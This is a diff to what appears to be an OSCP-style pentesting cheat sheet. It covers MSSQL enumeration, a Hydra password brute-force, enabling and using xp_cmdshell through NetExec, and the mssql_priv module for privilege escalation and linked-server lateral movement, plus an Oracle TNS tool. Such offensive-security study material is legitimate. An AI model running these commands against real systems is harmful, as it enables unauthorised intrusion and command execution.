@@ -234,10 +234,13 @@ Other modules:
   `nmap -sV --script=ms-sql-info,ms-sql-ntlm-info <target> -p1433` (pre-installed).  
   `impacket-mssqlclient <user>@<target>` (Impacket install as above).  
   `hydra -l sa -P <wordlist> <target> mssql` (brute; pre-installed).
-  `nxc mssql <target> -u user -p pass -q 'SELECT @@VERSION' (get version)
+  `nxc mssql <target> -u user -p pass -q 'SELECT @@VERSION' (get version)`
   Enable & use xp_cmdshell:  
-  `nxc mssql <target> -u user -p pass --enable-xp  
-  `nxc mssql <target> -u user -p pass -X 'whoami'  (after enable)
+  `nxc mssql <target> -u user -p pass --enable-xp`  
+  `nxc mssql <target> -u user -p pass -X 'whoami'  (after enable)`
+  Priv esc / link:  
+  `nxc mssql -M mssql_priv --options (view options for netexecs mssql_priv module )
+  `nxc mssql <target> -u user -p pass -M mssql_priv -o ACTION=enum/escalate/link TARGET=other_sql`  (Use cautiously in OSCP—escalate/link can trigger detections or require prior enum.) NetExec MSSQL priv module: enum current privs/paths, escalate (e.g., impersonate sa, enable xp_cmdshell), or link/query remote servers for lateral.
 
 - **1521/TCP - Oracle** (info disclosure, SID brute, TNS poisoning):  
   `tnscmd10g version -h <target>` (install via `git clone https://github.com/irsdl/tnscmd10g`).  
